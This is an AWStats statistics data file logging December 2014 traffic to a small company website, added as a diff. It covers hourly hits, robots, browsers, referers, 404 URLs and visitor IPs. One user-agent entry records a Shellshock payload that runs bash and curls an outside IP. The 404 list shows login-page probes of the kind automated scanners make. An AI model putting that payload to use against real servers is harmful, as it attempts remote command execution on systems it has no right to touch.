@@ -1,0 +1,502 @@
+AWSTATS DATA FILE 6.7 (build 1.892)
+# If you remove this file, all statistics for date 201412 will be lost/reset.
+
+# Position (offset in bytes) in this file of beginning of each section for
+# direct I/O access. If you made changes somewhere in this file, you should
+# also remove completely the MAP section (AWStats will rewrite it at next
+# update).
+BEGIN_MAP 27
+POS_GENERAL 1864                
+POS_TIME 2536                
+POS_VISITOR 9303                
+POS_DAY 13354               
+POS_DOMAIN 3396                
+POS_LOGIN 3629                
+POS_ROBOT 3784                
+POS_WORMS 4415                
+POS_EMAILSENDER 4546                
+POS_EMAILRECEIVER 4689                
+POS_SESSION 14143               
+POS_SIDER 14343               
+POS_FILETYPES 4824                
+POS_OS 5068                
+POS_BROWSER 5199                
+POS_SCREENSIZE 5608                
+POS_UNKNOWNREFERER 5682                
+POS_UNKNOWNREFERERBROWSER 6231                
+POS_ORIGIN 6419                
+POS_SEREFERRALS 6560                
+POS_PAGEREFS 6717                
+POS_SEARCHWORDS 7171                
+POS_KEYWORDS 7377                
+POS_MISC 2200                
+POS_ERRORS 7484                
+POS_CLUSTER 3485                
+POS_SIDER_404 7599                
+END_MAP
+
+# LastLine    = Date of last record processed - Last record line number in last log - Last record offset in last log - Last record signature value
+# FirstTime   = Date of first visit for history file
+# LastTime    = Date of last visit for history file
+# LastUpdate  = Date of last update - Nb of parsed records - Nb of parsed old records - Nb of parsed new records - Nb of parsed corrupted - Nb of parsed dropped
+# TotalVisits = Number of visits
+# TotalUnique = Number of unique visitors
+# MonthHostsKnown   = Number of hosts known
+# MonthHostsUnKnown = Number of hosts unknown
+BEGIN_GENERAL 8
+LastLine 20150101001159 1 0 18714365999487
+FirstTime 20141201135530
+LastTime 20141231214224
+LastUpdate 20150102030751 1 0 0 0 0
+TotalVisits 115                 
+TotalUnique 94                  
+MonthHostsKnown 0                   
+MonthHostsUnknown 100                 
+END_GENERAL
+
+# Misc ID - Pages - Hits - Bandwidth
+BEGIN_MISC 10
+QuickTimeSupport 0 0 0
+JavaEnabled 0 0 0
+JavascriptDisabled 0 0 0
+PDFSupport 0 0 0
+WindowsMediaPlayerSupport 0 0 0
+AddToFavourites 0 2 0
+RealPlayerSupport 0 0 0
+TotalMisc 0 0 0
+DirectorSupport 0 0 0
+FlashSupport 0 0 0
+END_MISC
+
+# Hour - Pages - Hits - Bandwidth - Not viewed Pages - Not viewed Hits - Not viewed Bandwidth
+BEGIN_TIME 24
+0 7 87 11628945 29 60 1234361
+1 7 39 1300476 23 35 1264156
+2 7 56 6959235 28 69 1954624
+3 26 81 2175109 21 36 1109336
+4 14 119 12497088 28 40 582525
+5 13 33 845293 15 19 522917
+6 1 21 643953 49 54 740727
+7 16 16 264935 37 57 1204284
+8 10 58 7835393 41 59 1817775
+9 4 5 33740 51 91 2447822
+10 2 2 63096 58 71 1312208
+11 50 273 33428606 60 85 3390055
+12 12 164 18734300 46 76 1223793
+13 13 189 33834472 30 43 1556493
+14 4 12 950642 18 45 1871209
+15 25 207 26549956 30 35 113488
+16 22 113 13404004 30 35 1350194
+17 10 130 17506757 35 60 3295788
+18 13 98 8042642 32 36 559776
+19 11 102 13384587 26 35 2270577
+20 25 106 11891534 33 49 567158
+21 41 304 42178154 23 28 336260
+22 21 56 1420735 33 37 451412
+23 11 123 18477124 87 143 2627074
+END_TIME
+
+# Domain - Pages - Hits - Bandwidth
+# The 10 first Pages must be first (order not required for others)
+BEGIN_DOMAIN 1
+ip 365 2394 284050776
+END_DOMAIN
+
+# Cluster ID - Pages - Hits - Bandwidth
+BEGIN_CLUSTER 0
+END_CLUSTER
+
+# Login - Pages - Hits - Bandwidth - Last visit
+# The 10 first Pages must be first (order not required for others)
+BEGIN_LOGIN 0
+END_LOGIN
+
+# Robot ID - Hits - Bandwidth - Last visit - Hits on robots.txt
+# The 10 first Hits must be first (order not required for others)
+BEGIN_ROBOT 14
+googlebot 445 10023177 20141231202320 0
+\wbot[\/\-] 247 12950183 20141231182536 0
+baiduspider 105 2358249 20141231101019 0
+mj12bot 40 631262 20141227044004 0
+archive\.org_bot 35 4409145 20141222153348 0
+robot 34 676278 20141231193732 0
+crawl 14 0 20141229071055 0
+ia_archiver 11 152060 20141214130859 0
+python 7 0 20141210151531 0
+titan 7 181829 20141229101306 0
+surveybot 2 63096 20141223072221 0
+seznambot 1 31548 20141218111253 0
+slurp 1 31548 20141207171538 0
+netcraft 1 31548 20141210072619 0
+END_ROBOT
+
+# Worm ID - Hits - Bandwidth - Last visit
+# The 5 first Hits must be first (order not required for others)
+BEGIN_WORMS 0
+END_WORMS
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first Hits must be first (order not required for others)
+BEGIN_EMAILSENDER 0
+END_EMAILSENDER
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first hits must be first (order not required for others)
+BEGIN_EMAILRECEIVER 0
+END_EMAILRECEIVER
+
+# Files type - Hits - Bandwidth - Bandwidth without compression - Bandwidth after compression
+BEGIN_FILETYPES 10
+css 557 18298237 0 0
+eot 10 204837 0 0
+png 135 11377992 0 0
+ttf 3 241956 0 0
+pdf 7 2192299 0 0
+woff 37 1599552 0 0
+html 308 5801693 0 0
+jpg 302 214378686 0 0
+js 997 29858814 0 0
+gif 38 96710 0 0
+END_FILETYPES
+
+# OS ID - Hits
+BEGIN_OS 8
+winxp 91
+winnt 1590
+linuxubuntu 1
+linux 116
+linuxfedora 1
+macosx 452
+win2003 11
+Unknown 132
+END_OS
+
+# Browser ID - Hits
+BEGIN_BROWSER 27
+firefox32.0 1
+firefox28.0 6
+firefox20.0 5
+firefox10.0 7
+firefox26.0 55
+firefox21.0 1
+firefox3.6.2 1
+firefox4.0 1
+firefox29.0 67
+lynx 2
+curl 1
+firefox3.5.2 1
+firefox34.0 204
+firefox2.0.0.13 13
+msie8.0 2
+firefox33.0 144
+mozilla 272
+firefox1.0 1
+netscape5.0 4
+firefox22.0 1
+firefox14.0.1 10
+msie7.0 94
+msie10.0 46
+firefox6.0 1
+msie9.0 51
+Unknown 23
+safari 1380
+END_BROWSER
+
+# Screen size - Hits
+BEGIN_SCREENSIZE 0
+END_SCREENSIZE
+
+# Unknown referer OS - Last visit date
+BEGIN_UNKNOWNREFERER 7
+- 20141213154039
+Wotbox/2.01_(_http://www.wotbox.com/bot/) 20141226202108
+Mozilla/5.0_(compatible;_Optimizer) 20141202213759
+()_{_:;};_/bin/bash_-c_'curl_http://176.102.38.36/search/e.php?h=lsquarellc.com/' 20141216042243
+DomainWho.is/1.0 20141213022319
+Lynx/2.8.5rel.1_libwww-FM/2.15FC_SSL-MM/1.4.1c_OpenSSL/0.9.7e-dev 20141209073317
+Mozilla/5.0_(compatible;_MSIE_10.0;_Windows_Phone_8.0;_Trident/6.0;_IEMobile/10.0;_ARM;_Touch;_HTC;_HTC6990LVW) 20141217174431
+END_UNKNOWNREFERER
+
+# Unknown referer Browser - Last visit date
+BEGIN_UNKNOWNREFERERBROWSER 3
+- 20141213154039
+Wotbox/2.01_(_http://www.wotbox.com/bot/) 20141226202108
+DomainWho.is/1.0 20141213022319
+END_UNKNOWNREFERERBROWSER
+
+# Origin - Pages - Hits 
+BEGIN_ORIGIN 6
+From0 197 248
+From1 0 0
+From2 19 21
+From3 9 9
+From4 140 2116
+From5 0 0
+END_ORIGIN
+
+# Search engine referers ID - Pages - Hits
+BEGIN_SEREFERRALS 1
+google 19 21
+END_SEREFERRALS
+
+# External page referers - Pages - Hits
+# The 10 first Pages must be first (order not required for others)
+BEGIN_PAGEREFS 5
+http://www.dice.com/jobsearch/company/DiceId_10433672/10433672 3 3
+http://www.dice.com/jobsearch/servlet/JobSearch 2 2
+http://www.bing.com/search 2 2
+http://www.sangheras.com/page_1154207427062.html 1 1
+http://businessdirectory.bizjournals.com/denver/information_technology/3344588/l-squared--llc.html 1 1
+END_PAGEREFS
+
+# Search keyphrases - Number of search
+# The 10 first number of search must be first (order not required for others)
+BEGIN_SEARCHWORDS 3
+lsquarellc.com 1
+l+squared+llc 1
+l+squared+arapahoe 1
+END_SEARCHWORDS
+
+# Search keywords - Number of search
+# The 10 first number of search must be first (order not required for others)
+BEGIN_KEYWORDS 5
+squared 2
+l 2
+lsquarellc.com 1
+arapahoe 1
+llc 1
+END_KEYWORDS
+
+# Errors - Hits - Bandwidth
+BEGIN_ERRORS 3
+403 2 214
+206 16 2074700
+404 330 189175
+END_ERRORS
+
+# URL with 404 errors - Hits - Last URL referer
+BEGIN_SIDER_404 43
+/images/apple-touch-icon-114x114.png 2 http://lsquarellc.com/contacts.html
+/robots.txt 180 -
+/apple-touch-icon.png 1 -
+/wp-login/ 1 -
+/vendor/mediaelement/'+a.url+' 1 -
+/vendor/mediaelement/'+this.escapeHTML(a)+' 3 -
+/directions.html 4 -
+/history.html 3 -
+/images/lsquared-logo-144x144.png 2 http://lsquarellc.com/
+/wordpress/wp-login.php 1 -
+/service3.html 5 -
+/whywork.html 10 -
+/leadership.html 6 -
+/admin/wp-login.php 1 -
+/performance.html 5 -
+/services/services.htm 2 -
+/images/apple-touch-icon.png 2 http://lsquarellc.com/contacts.html
+/wp-content/plugins/sexy-contact-form/includes/js/sexycontactform.js 2 -
+/images/apple-touch-icon-72x72.png 2 http://lsquarellc.com/contacts.html
+/fonts/glyphicons-halflings-regular.eot 16 -
+/wp/wp-login.php 1 -
+/service1.html 3 -
+/page-team.html 6 -
+/section/wp-login.php 1 -
+/career.html 4 -
+/apple-touch-icon-precomposed.png 1 -
+/L2title.jpg 1 -
+/administrator/index.php 1 -
+/portfolio-fullw.html 9 -
+/vendor/mediaelement/'+b.pluginPath+b.flashName+' 3 -
+/cgi-sys/entropysearch.cgi 1 -
+/projects.html 12 -
+/contact.html 4 -
+/images/lsquared-logo-114x114.png 2 http://lsquarellc.com/
+/blog/wp-login.php 1 -
+/overview.html 5 -
+/ivv.html/contacts.html 1 http://lsquarellc.com/ivv.html
+/images/apple-touch-icon-144x144.png 2 http://lsquarellc.com/contacts.html
+/wp-login.php 16 -
+/service2.html 4 -
+/7ff6a8e9 1 -
+/noaaimg.jpg 1 -
+/site/wp-login.php 1 -
+END_SIDER_404
+
+# Host - Pages - Hits - Bandwidth - Last visit date - [Start date of last visit] - [Last page of last visit]
+# [Start date of last visit] and [Last page of last visit] are saved only if session is not finished
+# The 10 first Hits must be first (order not required for others)
+BEGIN_VISITOR 100
+67.161.135.128 22 201 27251873 20141222045851
+217.151.51.35 20 55 1389187 20141201225534
+144.76.183.245 19 63 9182624 20141202213541
+81.144.138.34 19 19 261494 20141226202108
+207.234.185.95 17 17 239314 20141215110253
+209.34.200.5 16 82 7597207 20141215121239
+199.184.241.5 14 156 19438881 20141223164155
+46.4.124.178 12 12 176313 20141202165344
+50.195.88.9 12 63 7463708 20141210151531
+192.81.211.5 11 31 782197 20141230034411
+150.70.97.125 1 1 31548 20141231165008
+209.133.77.165 1 1 31548 20141217114903
+73.183.246.180 3 46 6743819 20141211190930
+79.129.9.3 0 1 2192 
+64.74.215.113 5 5 0 20141231084044
+54.167.208.226 1 1 12769 20141205195410
+38.100.21.67 6 11 243106 20141222043426
+93.170.186.71 1 1 31548 20141201170017
+213.159.38.90 2 2 63096 20141209201140
+68.48.152.214 4 49 6799356 20141209084740
+74.52.245.146 1 1 31548 20141206161338
+202.46.61.55 1 1 0 20141217023426
+166.113.0.50 3 76 7026664 20141211124140
+176.102.38.36 1 1 0 20141216042243
+83.223.122.6 1 1 31548 20141217114950
+123.125.71.53 1 1 12769 20141207075001
+220.181.108.80 1 1 31548 20141207075001
+73.181.38.110 0 1 256556 
+173.208.74.143 1 1 13371 20141211005632
+166.137.136.116 2 42 5784562 20141217211310
+146.184.160.23 3 51 9841319 20141203110220
+46.229.170.197 1 1 31548 20141212163635
+76.31.207.140 2 42 5784562 20141231214224
+24.159.117.53 2 42 5778335 20141204201302
+192.150.10.210 0 7 671196 
+54.174.116.148 1 1 31548 20141202153616
+216.203.116.104 2 42 5784562 20141229170431
+54.88.49.8 3 3 94644 20141223052302
+166.137.136.47 5 54 6927687 20141224024425
+123.125.71.112 1 1 12168 20141207075001
+5.9.11.122 1 1 31548 20141206100733
+198.252.44.12 9 9 283932 20141228233329
+75.166.137.85 3 47 6737717 20141231164926
+183.83.20.185 3 47 6743944 20141222232042
+166.137.118.124 2 42 5784562 20141217211239
+142.91.81.166 1 1 14902 20141211005642
+198.211.110.12 1 21 643953 20141226112831
+220.181.108.91 1 1 14902 20141207075001
+220.181.108.108 2 2 19461 20141207075001
+192.150.10.205 0 6 1957974 
+54.203.169.163 5 5 95928 20141208074620
+184.155.165.137 1 19 4951629 20141211230203
+74.93.228.185 2 42 5784562 20141201135532
+198.199.66.173 1 21 643953 20141220041727
+192.150.10.208 1 16 1368058 20141218124741
+50.183.226.126 2 42 5784562 20141231204133
+78.158.11.226 2 2 23096 20141209073317
+192.150.10.200 1 12 1787209 20141218124743
+54.77.186.76 2 2 63096 20141206124104
+74.115.251.126 4 44 5867880 20141210171738
+62.210.124.165 1 1 31548 20141204143947
+204.118.135.32 1 1 911247 20141202112217
+199.30.24.4 0 31 995897 
+54.154.70.56 2 2 63096 20141213154039
+73.169.11.141 7 99 13576760 20141203132825
+209.133.77.168 1 1 31548 20141212123750
+70.192.215.186 3 43 5822767 20141217174433
+192.81.210.204 1 21 643953 20141208063816
+157.55.39.81 0 1 4047 
+140.90.233.88 5 59 15980079 20141202135818
+108.62.82.173 1 1 31548 20141211015048
+73.178.67.17 2 41 5784437 20141210115532
+91.200.13.64 1 1 31548 20141202110548
+199.30.24.224 2 42 5820782 20141224155123
+207.118.28.203 2 42 5784562 20141214122951
+54.154.100.235 1 1 31548 20141223115901
+54.162.7.240 5 40 1233091 20141202031942
+174.16.101.253 9 97 12413324 20141218140335
+83.223.122.17 2 2 63096 20141217104450
+69.195.129.178 1 1 31548 20141222160754
+91.121.146.212 1 1 31548 20141213022319
+174.16.159.175 4 54 6686907 20141203231320
+54.164.232.215 1 1 31548 20141202152555
+76.106.59.56 6 44 1532446 20141214181754
+185.72.244.38 1 1 0 20141215190623
+199.30.24.211 2 5 972941 20141226085115
+24.237.198.54 2 42 5784562 20141214135739
+54.154.41.141 2 2 63096 20141207113754
+123.125.71.16 1 1 10718 20141207075002
+150.70.97.114 1 1 31548 20141222180812
+202.46.63.108 1 1 31548 20141218011505
+198.199.83.125 11 31 782197 20141214051516
+173.172.159.126 6 97 13107726 20141216155047
+54.86.209.250 1 1 31548 20141222081000
+8.28.16.254 1 1 911247 20141202112216
+69.58.178.57 10 10 159821 20141211030054
+173.208.74.176 2 2 46450 20141211015107
+123.125.71.36 1 1 31548 20141207224834
+220.181.108.139 1 1 12797 20141207075001
+142.91.81.178 1 1 13371 20141211015058
+END_VISITOR
+
+# Date - Pages - Hits - Bandwidth - Visits
+BEGIN_DAY 30
+20141201 23 98 7205297 3
+20141202 47 182 28527032 10
+20141203 21 259 36732985 7
+20141204 3 43 5809883 2
+20141205 2 2 44317 2
+20141206 4 4 126192 3
+20141207 11 11 209007 9
+20141208 6 26 739881 2
+20141209 9 54 6917096 4
+20141210 19 149 19116025 4
+20141211 23 157 19001575 9
+20141212 4 4 126192 4
+20141213 3 3 94644 2
+20141214 21 159 13883767 4
+20141215 36 102 7899617 5
+20141216 7 98 13107726 2
+20141217 28 247 33128379 9
+20141218 13 141 18517413 6
+20141219 5 52 6447100 1
+20141220 1 21 643953 1
+20141221 1 1 31548 1
+20141222 19 148 18723271 7
+20141223 5 52 6426878 3
+20141224 8 97 12748469 3
+20141225 1 1 31548 1
+20141226 22 76 2874285 3
+20141228 1 1 31548 1
+20141229 2 42 5784562 1
+20141230 11 31 782197 1
+20141231 9 133 18338389 5
+END_DAY
+
+# Session range - Number of visits
+BEGIN_SESSION 6
+5mn-15mn 3
+15mn-30mn 2
+2mn-5mn 2
+0s-30s 95
+30s-2mn 9
+30mn-1h 4
+END_SESSION
+
+# URL - Pages - Bandwidth - Entry - Exit
+# The 10 first Pages must be first (order not required for others)
+BEGIN_SIDER 25
+/ 123 3596472 97 54
+/css/fonts/font-awesome/fonts/fontawesome-webfont.woff 37 1599552 1 13
+/contacts.html 25 334275 2 9
+/team.html 23 286235 1 4
+/careers.html 17 159069 2 0
+/faqs.html 14 178766 2 3
+/page-about.html 13 193726 2 6
+/services.html 11 141053 0 3
+/informationassurance.html 10 107180 2 2
+/engineering.html 9 90936 0 2
+/disclosure.html 8 71672 0 1
+/css/fonts/star.eot 2 1676 0 0
+/ivv.html 6 61638 1 0
+/papers/nist.pdf 2 1822494 2 2
+/lisaklove.html 6 76782 1 1
+/janellehsia.html 7 85176 1 4
+/riskmanagement.html 6 58674 0 0
+/partners.html 8 90816 0 2
+/css/fonts/font-awesome/fonts/fontawesome-webfont.eot 6 191025 0 1
+/careers/systemsecurityeng.pdf 5 369805 0 3
+/culture.html 9 115713 0 2
+/pastperformance.html 7 78162 0 0
+/lorenzoanderson.html 6 75348 1 1
+/css/fonts/font-awesome/fonts/fontawesome-webfont.ttf 3 241956 0 2
+/vendor/rs-plugin/font/revicons.eot 2 12136 0 0
+END_SIDER
